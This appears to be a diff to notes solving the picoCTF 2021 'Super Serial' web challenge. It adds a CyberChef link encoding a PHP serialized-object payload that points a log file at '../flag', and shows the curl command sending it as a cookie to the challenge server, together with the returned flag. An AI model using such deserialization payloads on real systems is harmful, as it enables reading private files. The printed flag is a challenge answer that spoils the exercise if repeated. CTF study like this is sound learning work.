@@ -7,5 +7,8 @@ HINT: The flag is at ../flag
 
 https://picoctf2021.haydenhousen.com/web-exploitation/super-serial
 
+
+https://cyberchef.org/#recipe=To_Base64('A-Za-z0-9%2B/%3D')&input=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
+
 curl mercury.picoctf.net:8404/authentication.php --cookie "login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9"
 Deserialization error. picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_66832978}
